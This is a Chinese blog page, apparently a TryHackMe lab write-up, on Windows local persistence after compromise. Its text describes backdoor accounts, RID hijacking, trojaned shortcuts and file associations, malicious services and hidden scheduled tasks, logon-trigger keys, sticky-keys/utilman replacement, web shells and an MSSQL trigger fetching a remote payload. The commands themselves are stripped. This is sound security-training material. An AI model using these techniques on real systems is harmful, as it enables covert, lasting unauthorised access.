<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no"><title>THM-Windows本地持久性 | hybcx</title><meta name="keywords" content="TryHackMe"><meta name="author" content="hybcx,19815455497@163.com"><meta name="copyright" content="hybcx"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#f7f9fe"><meta name="mobile-web-app-capable" content="yes"><meta name="apple-touch-fullscreen" content="yes"><meta name="apple-mobile-web-app-title" content="THM-Windows本地持久性"><meta name="application-name" content="THM-Windows本地持久性"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="#f7f9fe"><meta property="og:type" content="article"><meta property="og:title" content="THM-Windows本地持久性"><meta property="og:url" content="http://hybcx.xyz/2024/02/06/thm-windows-ben-di-chi-jiu-xing/index.html"><meta property="og:site_name" content="hybcx"><meta property="og:description" content="0x01 简介 在目标的内部网络上获得第一个立足点后，您需要确保在真正获得皇冠上的宝石之前不会失去对它的访问权限。建立持久性是我们作为攻击者在获得网络访问权限时首先要做的任务之一。简而言之，持久性是指创建替代方法来重新获得对主机的访问权限，而无需再次经历利用阶段。 您希望尽快建立持久性的原因有很多，"><meta property="og:locale" content="zh-CN"><meta property="og:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408162252382.jpg"><meta property="article:author" content="hybcx"><meta property="article:tag"><meta name="twitter:card" content="summary"><meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408162252382.jpg"><meta name="description" content="0x01 简介 在目标的内部网络上获得第一个立足点后，您需要确保在真正获得皇冠上的宝石之前不会失去对它的访问权限。建立持久性是我们作为攻击者在获得网络访问权限时首先要做的任务之一。简而言之，持久性是指创建替代方法来重新获得对主机的访问权限，而无需再次经历利用阶段。 您希望尽快建立持久性的原因有很多，"><link rel="shortcut icon" href="/favicon.ico"><link rel="canonical" href="http://hybcx.xyz/2024/02/06/thm-windows-ben-di-chi-jiu-xing/"><link rel="preconnect" href="//cdn.cbd.int"/><link rel="preconnect" href="//hm.baidu.com"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><meta name="google-site-verification" content="xxx"/><meta name="baidu-site-verification" content="code-xxx"/><meta name="msvalidate.01" content="xxx"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.cbd.int/node-snackbar@0.1.16/dist/snackbar.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.cbd.int/@fancyapps/ui@5.0.28/dist/fancybox/fancybox.css" media="print" onload="this.media='all'"><script>var _hmt = _hmt || [];
(function() {
  var hm = document.createElement("script");
  hm.src = "https://hm.baidu.com/hm.js?d98ea8480e5ec98a243adfc7bd46b93a";
  var s = document.getElementsByTagName("script")[0]; 
  s.parentNode.insertBefore(hm, s);
})();
</script><script>const GLOBAL_CONFIG = {
  linkPageTop: {"enable":true,"title":"向✌们无限学习","addFriendPlaceholder":"昵称（请勿包含博客等字样）：\n网站地址（要求博客地址，请勿提交个人主页）：\n头像图片url（请提供尽可能清晰的图片，我会上传到我自己的图床）：\n描述：\n站点截图（可选）：\n"},
  peoplecanvas: undefined,
  postHeadAiDescription: {"enable":true,"gptName":"AnZhiYu","mode":"local","switchBtn":false,"btnLink":"https://afdian.net/item/886a79d4db6711eda42a52540025c377","randomNum":3,"basicWordCount":1000,"key":"xxxx","Referer":"https://xx.xx/"},
  diytitle: {"enable":true,"leaveTitle":"w(ﾟДﾟ)w 不要走！再看看嘛！","backTitle":"♪(^∇^*)欢迎肥来！"},
  LA51: {"enable":true,"ck":"3JLPGIZJOJw6Nvu2","LingQueMonitorID":"3JLPOLHV5W6IAty5"},
  greetingBox: {"enable":true,"default":"晚上好👋","list":[{"greeting":"晚安😴","startTime":0,"endTime":5},{"greeting":"早上好鸭👋, 祝你一天好心情！","startTime":6,"endTime":9},{"greeting":"上午好👋, 状态很好，鼓励一下～","startTime":10,"endTime":10},{"greeting":"11点多啦, 在坚持一下就吃饭啦～","startTime":11,"endTime":11},{"greeting":"午安👋, 宝贝","startTime":12,"endTime":14},{"greeting":"🌈充实的一天辛苦啦！","startTime":14,"endTime":18},{"greeting":"19点喽, 奖励一顿丰盛的大餐吧🍔。","startTime":19,"endTime":19},{"greeting":"晚上好👋, 在属于自己的时间好好放松😌~","startTime":20,"endTime":24}]},
  twikooEnvId: '',
  commentBarrageConfig:undefined,
  root: '/',
  preloader: {"source":3},
  friends_vue_info: undefined,
  navMusic: true,
  mainTone: undefined,
  authorStatus: {"skills":null},
  algolia: {"appId":"Z7A3XW4R2I","apiKey":"12db1ad54372045549ef465881c17e743","indexName":"my-hexo-blog","hits":{"per_page":6},"languages":{"input_placeholder":"输入关键词后按下回车查找","hits_empty":"找不到您查询的内容：${query}","hits_stats":"找到 ${hits} 条结果，用时 ${time} 毫秒"}},
  localSearch: undefined,
  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"简","rightMenuMsgToTraditionalChinese":"转为繁体","rightMenuMsgToSimplifiedChinese":"转为简体"},
  noticeOutdate: {"limitDay":365,"position":"top","messagePrev":"It has been","messageNext":"days since the last update, the content of the article may be outdated."},
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":330},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: true,
    simplehomepage: false,
    post: true
  },
  runtime: '天',
  date_suffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: {"copy":true,"copyrightEbable":false,"limitCount":50,"languages":{"author":"作者: hybcx","link":"链接: ","source":"来源: hybcx","info":"著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。","copySuccess":"复制成功，复制和转载请标注本文地址"}},
  lightbox: 'mediumZoom',
  Snackbar: {"chs_to_cht":"你已切换为繁体","cht_to_chs":"你已切换为简体","day_to_night":"你已切换为深色模式","night_to_day":"你已切换为浅色模式","bgLight":"#425AEF","bgDark":"#1f1f1f","position":"top-center"},
  source: {
    justifiedGallery: {
      js: 'https://cdn.cbd.int/flickr-justified-gallery@2.1.2/dist/fjGallery.min.js',
      css: 'https://cdn.cbd.int/flickr-justified-gallery@2.1.2/dist/fjGallery.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: true,
  isAnchor: false,
  shortcutKey: undefined,
  autoDarkmode: true
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  configTitle: 'hybcx',
  title: 'THM-Windows本地持久性',
  postAI: '',
  pageFillDescription: '0x01 简介, 0x02 本地持久性, 2.1 篡改非特权账户, 分配组成员资格, 特殊权限和安全描述符, RID劫持, 2.2 后门文件, 可执行文件, 快捷方式文件, 劫持文件关联, 2.3 滥用服务, 创建后门服务, 修改现有服务, 2.4 滥用计划任务, 任务调度程序, 让我们的任务隐形, 2.5 登录触发持久化, 启动文件夹, Run / RunOnce, 登录系统, 登录脚本, 2.6 登录屏幕/RDP 后门, Sticky Keys 粘滞键, Utilman, 2.7 通过现有服务持续存在, 使用 Web Shell, 使用 MSSQL 作为后门简介在目标的内部网络上获得第一个立足点后您需要确保在真正获得皇冠上的宝石之前不会失去对它的访问权限建立持久性是我们作为攻击者在获得网络访问权限时首先要做的任务之一简而言之持久性是指创建替代方法来重新获得对主机的访问权限而无需再次经历利用阶段您希望尽快建立持久性的原因有很多包括重新利用并不总是可能的一些不稳定的利用可能会在利用过程中杀死易受攻击的进程让您对其中一些进程进行一次攻击获得立足点很难重现例如如果您使用网络钓鱼活动来获得第一次访问权限那么重复它来重新获得对主机的访问权限简直就是太多的工作您的第二次营销活动也可能不会那么有效导致您无法访问网络蓝队正在追捕您如果您的操作被检测到用于获得您首次访问权限的任何漏洞都可能会被修补您正在与时间赛跑虽然您可以保留某些管理员的密码哈希并重新使用它来重新连接但您总是面临这些凭据在某些时候被轮换的风险另外还有一些更狡猾的方法可以让您重新获得对受感染机器的访问权从而使蓝队的日子变得更加艰难本地持久性拥有管理员凭据将是在计算机中实现持久性的最简单方法然而为了让蓝队更难检测到我们我们可以操纵非特权用户这些用户通常不会像管理员那样受到监控并以某种方式授予他们管理权限请注意我们假设您已经以某种方式获得了管理访问权限并尝试从那里建立持久性篡改非特权账户分配组成员资格对于这部分任务我们假设您已转储受害计算机的密码哈希值并成功破解了正在使用的非特权帐户的密码让非特权用户获得管理权限的直接方法是使其成为管理员组的一部分我们可以使用以下命令轻松实现此目的这将允许您使用或任何其他可用的远程管理服务来访问服务器如果这看起来太可疑您可以使用备份操作员组该组中的用户没有管理权限但可以读取写入系统上的任何文件或注册表项忽略任何配置的这将使我们能够复制和注册表配置单元的内容然后我们可以使用它们来恢复所有用户的密码哈希值从而使我们能够轻松升级到任何管理帐户为此我们首先将该帐户添加到组由于这是一个非特权帐户因此它无法通过或返回计算机除非我们将其添加到远程桌面用户或远程管理用户组我们将使用来完成此任务我们假设我们已经将凭据转储到服务器上并拥有的密码让我们使用其凭据通过进行连接如果您现在尝试从攻击者计算机进行连接您会惊讶地发现即使您位于组中您也无法按预期访问所有文件快速检查我们分配的组将表明我们是备份操作员的一部分但该组已被禁用这是由于用户帐户控制实现的功能之一是它会在远程登录时剥夺任何本地帐户的管理权限虽然您可以通过从图形用户会话提升您的权限请在此处阅读有关的更多信息但如果您使用则您将被限制为没有管理权限的有限访问令牌为了能够从您的用户那里重新获得管理权限我们必须通过将以下注册表项更改为来禁用一旦所有这些都设置完毕我们就可以使用我们的后门用户了首先让我们建立一个连接并检查是否为我们的用户启用了组然后我们继续备份和文件并将它们下载到我们的攻击者计算机上注意如果下载文件的时间过长请随意使用任何其他传输方法有了这些文件我们可以使用或其他类似工具转储所有用户的密码哈希值最后执行以使用管理员权限连接到受害计算机特殊权限和安全描述符无需修改任何组成员身份即可实现与将用户添加到组类似的结果特殊组之所以特殊是因为操作系统默认为它们分配了特定的权限权限只是在系统本身上执行任务的能力它们包括简单的事情例如能够关闭服务器的能力以及非常特权的操作例如能够获得系统上任何文件的所有权您可以在此处找到可用权限的完整列表以供参考对于组默认分配有以下两个权限用户可以读取系统中的任何文件忽略任何用户可以写入系统中的任何文件忽略任何我们可以将此类权限分配给任何用户无论其组成员身份如何为此我们可以使用命令首先我们将当前配置导出到临时文件我们打开文件并将用户添加到有关和的配置行中我们最终将文件转换为文件然后使用该文件将配置加载回系统中您现在应该拥有一个与任何备份操作员具有同等权限的用户用户仍然无法通过登录系统所以让我们做点什么我们不会将用户添加到远程管理用户组而是更改与服务关联的安全描述符以允许进行连接将安全描述符视为但应用于其他系统设施要打开安全描述符的配置窗口您可以在中使用以下命令为此您需要使用会话这将打开一个窗口您可以在其中添加并为其分配连接到的完整权限完成此操作后我们的用户就可以通过进行连接由于用户具有和权限因此我们可以重复这些步骤以从恢复密码哈希并重新连接到管理员用户请注意要使该用户完全使用给定的权限您必须更改注册表项但我们已经完成了此操作以获得先前的标志如果您检查用户的组成员身份它看起来就像是普通用户根本就没有什么可疑的地方我们再次假设我们已经将凭据转储到服务器上并拥有的密码让我们使用连接其凭据劫持无需成为管理员即可获得管理权限的另一种方法是更改某些注册表值使操作系统认为您是管理员创建用户时会为其分配一个称为相对的标识符只是代表系统中用户的数字标识符当用户登录时进程从注册表配置单元获取其并创建与该关联的访问令牌如果我们可以篡改注册表值我们可以通过将相同的关联到两个帐户让为非特权用户分配管理员访问令牌在任何系统中默认管理员帐户分配的普通用户通常具有要查找为任何用户分配的您可以使用以下命令是的最后一位为管理员为是一个标识符允许操作系统跨域识别用户但对于此任务我们不会太在意它的其余部分现在我们只需将分配给为此我们需要使用访问仅限于帐户因此即使是管理员也无法对其进行编辑要以身份运行我们将使用它可以在您的计算机中的中找到从中我们将转到其中计算机中的每个用户都有一个密钥由于我们要修改因此需要搜索其为十六进制的密钥在对应的下会有一个叫做的值它在位置保存了用户的有效请注意使用小端表示法存储因此其字节显示为反向现在我们将用十六进制的管理员替换这两个字节并交换字节下次登录时会将其与管理员相同的关联起来并授予它们相同的权限对于此任务我们假设您已经破坏了系统并获取了的密码为了您的方便用户可以使用以下凭据通过进行连接后门文件建立持久性的另一种方法包括篡改我们知道用户定期交互的一些文件通过对这些文件进行一些修改我们可以植入后门每当用户访问它们时就会执行这些后门由于我们不想创建任何可能暴露我们身份的警报因此我们更改的文件必须继续按预期为用户工作虽然植入后门的机会有很多但我们将检查最常用的后门可执行文件如果您在桌面上发现任何可执行文件则用户很可能会经常使用它假设我们找到了的快捷方式如果我们检查快捷方式的属性我们可以看到它通常指向从那时起我们可以将可执行文件下载到攻击者的计算机上并修改它以运行我们想要的任何有效负载您可以使用轻松地将您偏好的有效负载植入到任何文件中二进制文件仍将照常工作但通过在二进制文件中添加额外的线程以静默方式执行额外的有效负载要创建后门我们可以使用以下命令生成的将在用户没有注意到的情况下执行有效负载虽然这种方法足以建立持久性但让我们看看其他更狡猾的技术快捷方式文件如果我们不想修改可执行文件我们总是可以篡改快捷方式文件本身与其直接指向预期的可执行文件我们可以将其更改为指向一个脚本该脚本将运行一个后门然后正常执行通常的程序对于此任务让我们检查管理员桌面上的快捷方式如果我们右键单击它并转到属性我们将看到它指向的位置在劫持快捷方式的目标之前让我们在或任何其他隐蔽位置创建一个简单的脚本该脚本将执行反向然后从快捷方式属性上的原始位置运行最后我们将更改快捷方式以指向我们的脚本请注意执行此操作时快捷方式的图标可能会自动调整请务必将图标指向原始可执行文件以便用户不会看到任何可见的更改我们还想在隐藏窗口上运行脚本为此我们将选项添加到快捷方式的最终目标是让我们启动一个监听器来接收攻击者机器上的反向如果双击该快捷方式您应该会获得与攻击者计算机的连接同时用户将得到一个正如他们所期望的计算器您可能会注意到命令提示符在屏幕上闪烁并立即消失希望普通用户可能不会太介意这一点劫持文件关联除了通过可执行文件或快捷方式进行持久化之外我们还可以劫持任何文件关联以强制操作系统在用户打开特定文件类型时运行默认操作系统文件关联保存在注册表内其中下为每个文件类型存储一个密钥假设我们要检查使用哪个程序打开文件我们可以检查子项并找到与其关联的程序只是系统上安装的程序的标识符对于文件我们将具有以下然后我们可以搜索相应的子项也在下在本例中为我们将在其中找到负责处理的程序的引用文件大多数条目在下都有一个子项其中指定了对具有该扩展名的文件运行的默认命令在这种情况下当您尝试打开文件时系统将执行其中表示打开的文件的名称如果我们想劫持这个扩展我们可以用执行后门的脚本替换命令然后像往常一样打开文件首先我们创建一个包含以下内容的脚本并将其保存到请注意在中我们必须将传递给记事本因为它将包含要打开的文件的名称如通过给出的那样现在让我们更改注册表项以在隐藏窗口中运行后门脚本最后为反向创建一个侦听器并尝试打开受害计算机上的任何文件如果需要请创建一个您应该会收到一个具有打开该文件的用户权限的反向这里建了个然后双击执行即可拿滥用服务服务提供了一种建立持久性的好方法因为它们可以配置为在受害计算机启动时在后台运行如果我们可以利用任何服务为我们运行某些东西我们就可以在每次启动时重新获得对受害计算机的控制服务基本上是在后台运行的可执行文件配置服务时您可以定义将使用哪个可执行文件并选择该服务是在计算机启动时自动运行还是应该手动启动我们可以通过两种主要方式滥用服务来建立持久性创建一项新服务或修改现有服务来执行我们的有效负载创建后门服务我们可以使用以下命令创建并启动名为的服务注意每个等号后面必须有一个空格才能使该命令起作用服务启动时将执行命令将管理员密码重置为请注意该服务如何设置为自动启动以便它无需用户交互即可运行重置用户密码效果很好但我们还可以使用创建一个反向并将其与创建的服务关联起来但请注意服务可执行文件是唯一的因为它们需要实现由系统处理的特定协议如果要创建与服务兼容的可执行文件可以在中使用格式之后在受害机上的下载上述然后您可以将可执行文件复制到目标系统例如这里我是并将服务的指向它在执行这应该会创建一个返回到攻击者计算机的连接修改现有服务虽然为持久性创建新服务效果很好但蓝队可能会监控整个网络上的新服务创建我们可能希望重用现有服务而不是创建服务来避免检测通常任何禁用的服务都是一个很好的候选者因为它可以在用户没有注意到的情况下进行更改您可以使用以下命令获取可用服务的列表可以看到有很多这里放一个简单模板您应该能够找到名为的已停止服务要查询服务的配置可以使用以下命令使用服务进行持久化时我们关心三件事可执行文件应该指向我们的有效负载服务应该是自动的以便有效负载无需用户交互即可运行是运行服务的帐户最好将其设置为以获取权限让我们首先使用创建一个新的反向这里我就用旧的了要重新配置参数我们可以使用以下命令然后您可以再次查询服务的配置以检查是否一切按预期进行那我们直接启动该服务即可滥用计划任务如果需要我们还可以使用计划任务来建立持久性有多种方法可以在系统中安排有效负载的执行让我们看看其中的一些任务调度程序安排任务的最常见方法是使用内置的任务计划程序任务计划程序允许对任务启动时间进行精细控制允许您配置在特定时间激活定期重复甚至在发生特定系统事件时触发的任务在命令行中您可以使用与任务计划程序交互该命令的完整参考可以在网站上找到让我们创建一个每分钟运行一次反向的任务在现实场景中您不希望负载如此频繁地运行但我们不想在这个房间等待太久注意请务必使用作为任务名称否则您将不会获得该标志前面的命令将创建一个任务并向攻击者执行反向和选项指示任务应每分钟运行一次选项指示该任务将以权限运行要检查我们的任务是否已成功创建我们可以使用以下命令让我们的任务隐形我们的任务现在应该已经启动并运行但是如果受感染的用户尝试列出其计划任务我们的后门将会很明显为了进一步隐藏我们的计划任务我们可以通过删除其安全描述符使其对系统中的任何用户都不可见安全描述符只是一个它说明哪些用户有权访问计划任务如果您的用户不允许查询计划任务您将无法再看到它因为只会向您显示您有权使用的任务删除相当于禁止所有用户访问计划任务包括管理员所有计划任务的安全描述符都存储在中您将找到每个任务的注册表项其中名为的值包含安全描述符仅当您拥有权限时才能删除该值为了隐藏我们的任务让我们删除之前创建的任务的值为此我们将使用在中提供以系统权限打开然后我们将删除任务的安全描述符如果我们尝试再次查询我们的服务系统会告诉我们没有这样的任务如果我们在攻击者的机器上启动一个监听器我们应该会在一分钟后得到一个登录触发持久化用户执行的某些操作也可能绑定到执行特定的有效负载以实现持久性操作系统提供了多种将有效负载与特定交互相关联的方法此任务将研究植入有效负载的方法这些有效负载将在用户登录系统时执行启动文件夹每个用户在下都有一个文件夹您可以在其中放置要在用户登录时运行的可执行文件攻击者只需将有效负载放入其中即可实现持久性请注意每个用户只会运行其文件夹中可用的内容如果我们想强制所有用户在登录时运行有效负载我们可以以相同的方式使用下的文件夹对于此任务让我们使用生成反向有效负载然后我们将把有效负载复制到受害者机器中您可以使用生成并在受害计算机上使用来提取文件然后我们将有效负载存储到文件夹中以便为登录计算机的任何用户获取现在请务必从开始菜单注销您的会话关闭窗口还不够因为它会使您的会话保持打开状态您还可以通过注册表强制用户在登录时执行程序您可以使用以下注册表项来指定在登录时运行的应用程序而不是将有效负载传递到特定目录下的注册表项仅适用于当前用户下的注册表项适用于所有人在键下指定的任何程序都将在用户每次登录时运行键下指定的程序将仅执行一次对于此任务让我们使用创建一个新的反向将其传输到受害机器后让我们将其移动到然后我们在下创建一个注册表项条目的名称可以是您喜欢的任何内容值将是我们要执行的命令注意在实际环境中您可以为注册表项使用任何名称但对于此任务您需要使用来接收标志完成此操作后退出当前会话并再次登录您应该会收到一个可能需要大约秒登录系统登录时自动启动程序的另一种替代方法是滥用这是一种组件可在身份验证除其他外后立即加载您的用户配置文件在下使用一些注册表项这对于获得持久性可能很有趣指向它负责恢复您的用户配置文件首选项指向系统的通常是如果我们用一些反向替换任何可执行文件我们就会破坏登录序列这是我们所不希望的有趣的是您可以附加用逗号分隔的命令将处理所有命令让我们从创建一个开始我们将像之前一样将转移到受害机器上然后我们可以将复制到我们喜欢的任何目录在这种情况下我们将使用然后我们更改中的或在本例中我们将使用但使用的过程是相同的注意虽然和都可用于在现实场景中实现持久性但要获取此房间中的标志您将需要使用登录脚本加载用户配置文件时所做的事情之一是检查名为的环境变量我们可以使用此环境变量将登录脚本分配给用户该脚本将在登录计算机时运行默认情况下未设置该变量因此我们可以创建它并分配我们喜欢的任何脚本请注意每个用户都有自己的环境变量因此您需要分别为每个用户设置后门让我们首先创建一个用于此技术的反向我们将像之前一样将转移到受害机器上然后我们可以将复制到我们喜欢的任何目录在这种情况下我们将使用为用户创建环境变量您可以转到注册表中的我们将使用条目指向我们的有效负载以便在用户登录时加载它请注意此注册表项在中没有等效项这使得您的后门仅适用于当前用户完成此操作后退出当前会话并再次登录您应该会收到一个可能需要大约秒登录屏幕后门如果我们对机器有物理访问权限在我们的例子中是您可以在登录屏幕后门来访问终端而无需拥有机器的有效凭据为此我们将研究两种依赖辅助功能的方法粘滞键当按下等组合键时您可以将配置为使用粘滞键这样您就可以按顺序而不是同时按下组合按钮从这个意义上说如果粘滞键处于活动状态您可以按下并释放按下并释放最后按下并释放来实现相同的效果效果与按组合键一样为了使用粘滞键建立持久性我们将滥用任何安装中默认启用的快捷方式该快捷方式允许我们通过按次来激活粘滞键输入快捷方式后我们通常会看到如下所示的屏幕按次后将执行中的二进制文件如果我们能够将此类二进制文件替换为我们偏好的有效负载则我们可以使用快捷方式触发它有趣的是我们甚至可以在输入任何凭据之前从登录屏幕执行此操作登录屏幕后门的一种简单方法是将替换为的副本这样我们就可以使用粘滞键快捷键生成控制台甚至可以从日志记录屏幕中生成控制台要覆盖我们首先需要获得该文件的所有权并授予当前用户修改它的权限只有这样我们才能用的副本替换它我们可以使用以下命令来做到这一点执行此操作后从开始菜单锁定您的会话您现在应该可以按五次直接从登录屏幕访问具有系统权限的终端是一个内置的应用程序用于在锁定屏幕期间提供轻松访问选项当我们单击登录屏幕上的轻松访问按钮时它会以系统权限执行如果我们将其替换为的副本我们可以再次绕过登录屏幕为了替换我们执行与类似的过程要触发我们的终端我们将从开始按钮锁定屏幕最后继续单击轻松访问按钮由于我们将替换为副本因此我们将获得具有权限的命令提示符通过现有服务持续存在如果您不想使用功能来隐藏后门您始终可以从任何可用于为您运行代码的现有服务中获益此任务将探讨如何在典型的服务器设置中植入后门尽管如此您对执行内容有一定程度控制的任何其他应用程序都应该类似地存在后门可能性是无止境使用在服务器中实现持久化的常用方法是将上传到目录这很简单将授予我们使用中配置的用户的权限进行访问默认情况下为即使这是一个非特权用户它也具有特殊的提供了一种使用各种已知漏洞升级到管理员的简单方法有关如何滥用此权限的详细信息请参阅让我们首先下载这里提供了一个现成的但您可以随意使用您喜欢的任何一个将其传输到受害计算机并将其移至默认情况下位于目录中这里依旧在攻击机上开启服务在受害机上用下载木马注意根据您创建传输的方式文件中的权限可能不允许服务器访问它如果您在访问的时遇到权限被拒绝错误只需授予每个人对该文件的完全权限即可使其正常工作您可以使用来做到这一点然后我们可以通过指向以下从服务器运行命令使用作为后门在安装中植入后门的方法有多种现在我们将看看其中一个滥用触发器的情况简而言之中的触发器允许您绑定在数据库中发生特定事件时要执行的操作这些事件的范围可以从用户登录到从给定表中插入更新或删除数据对于此任务我们将为数据库中的任何创建触发器在创建触发器之前我们必须首先在数据库上重新配置一些东西首先我们需要启用存储过程是一个存储过程在任何安装中默认提供允许您直接在系统控制台中运行命令但默认情况下处于禁用状态要启用它请从开始菜单打开当要求进行身份验证时只需使用身份验证默认值您将使用当前用户的凭据登录默认情况下本地管理员帐户将有权访问所有数据库登录后单击新建查询按钮打开查询编辑器运行以下语句启用配置中的高级选项然后继续启用之后我们必须确保任何访问数据库的网站都可以运行默认情况下只有具有角色的数据库用户才能执行此操作由于预计应用程序会使用受限数据库用户因此我们可以向所有用户授予权限来模拟用户这是默认的数据库管理员之后我们必须确保任何访问数据库的网站都可以运行默认情况下只有具有角色的数据库用户才能执行此操作由于预计应用程序会使用受限数据库用户因此我们可以向所有用户授予权限来模拟用户这是默认的数据库管理员完成所有这些之后我们终于配置了一个触发器我们首先更改为数据库我们的触发器将利用执行从攻击者控制的服务器下载并运行文件触发器将配置为每当将放入数据库的表中时执行现在后门已设置完毕让我们在攻击者的计算机中创建其中将包含反向我们需要打开两个终端来处理此漏洞利用中涉及的连接触发器将执行第一次连接来下载并执行我们的触发器使用端口第二个连接将是端口上的反向返回到我们的攻击者计算机一切准备就绪后让我们导航到并将员工插入到应用程序中由于应用程序将向数据库发送语句因此我们的将为我们提供对系统控制台的访问执行之后访问受害机网站如上图添加用户点击即可看到下图拿到',
  isPost: true,
  isHome: false,
  isHighlightShrink: true,
  isToc: true,
  postUpdate: '2024-02-06 18:59:04',
  postMainColor: '',
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
      win.saveToLocal = {
        set: (key, value, ttl) => {
          if (ttl === 0) return
          const now = Date.now()
          const expiry = now + ttl * 86400000
          const item = {
            value,
            expiry
          }
          localStorage.setItem(key, JSON.stringify(item))
        },
      
        get: key => {
          const itemStr = localStorage.getItem(key)
      
          if (!itemStr) {
            return undefined
          }
          const item = JSON.parse(itemStr)
          const now = Date.now()
      
          if (now > item.expiry) {
            localStorage.removeItem(key)
            return undefined
          }
          return item.value
        }
      }
    
      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        script.onerror = reject
        script.onload = script.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          script.onload = script.onreadystatechange = null
          resolve()
        }

        Object.keys(attr).forEach(key => {
          script.setAttribute(key, attr[key])
        })

        document.head.appendChild(script)
      })
    
      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onerror = reject
        link.onload = link.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          link.onload = link.onreadystatechange = null
          resolve()
        }
        document.head.appendChild(link)
      })
    
      win.activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#18171d')
        }
      }
      win.activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#f7f9fe')
        }
      }
      const t = saveToLocal.get('theme')
    
          const isDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches
          const isLightMode = window.matchMedia('(prefers-color-scheme: light)').matches
          const isNotSpecified = window.matchMedia('(prefers-color-scheme: no-preference)').matches
          const hasNoSupport = !isDarkMode && !isLightMode && !isNotSpecified

          if (t === undefined) {
            if (isLightMode) activateLightMode()
            else if (isDarkMode) activateDarkMode()
            else if (isNotSpecified || hasNoSupport) {
              const now = new Date()
              const hour = now.getHours()
              const isNight = hour <= 6 || hour >= 18
              isNight ? activateDarkMode() : activateLightMode()
            }
            window.matchMedia('(prefers-color-scheme: dark)').addListener(e => {
              if (saveToLocal.get('theme') === undefined) {
                e.matches ? activateDarkMode() : activateLightMode()
              }
            })
          } else if (t === 'light') activateLightMode()
          else activateDarkMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
      const detectApple = () => {
        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
          document.documentElement.classList.add('apple')
        }
      }
      detectApple()
    })(window)</script><meta name="generator" content="Hexo 7.3.0">
<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
</head><body data-type="anzhiyu"><div id="web_bg"></div><div id="an_music_bg"></div><div id="loading-box" onclick="document.getElementById(&quot;loading-box&quot;).classList.add(&quot;loaded&quot;)"><div class="loading-bg"><img class="loading-img nolazyload" alt="加载头像" src="https://npm.elemecdn.com/anzhiyu-blog-static@1.0.4/img/avatar.jpg"/><div class="loading-image-dot"></div></div></div><script>const preloader = {
  endLoading: () => {
    document.getElementById('loading-box').classList.add("loaded");
  },
  initLoading: () => {
    document.getElementById('loading-box').classList.remove("loaded")
  }
}
window.addEventListener('load',()=> { preloader.endLoading() })
setTimeout(function(){preloader.endLoading();},10000)

if (true) {
  document.addEventListener('pjax:send', () => { preloader.initLoading() })
  document.addEventListener('pjax:complete', () => { preloader.endLoading() })
}</script><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.1.10/progress_bar/progress_bar.css"/><script async="async" src="https://cdn.cbd.int/pace-js@1.2.4/pace.min.js" data-pace-options="{ &quot;restartOnRequestAfter&quot;:false,&quot;eventLag&quot;:false}"></script><div class="post" id="body-wrap"><header class="post-bg" id="page-header"><nav id="nav"><div id="nav-group"><span id="blog_name"><div class="back-home-button"><i class="anzhiyufont anzhiyu-icon-grip-vertical"></i><div class="back-menu-list-groups"><div class="back-menu-list-group"><div class="back-menu-list-title">网页</div><div class="back-menu-list"><a class="back-menu-item" target="_blank" rel="noopener" href="https://blog.anheyu.com/" title="博客"><img class="back-menu-item-icon" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/img/favicon.ico" alt="博客"/><span 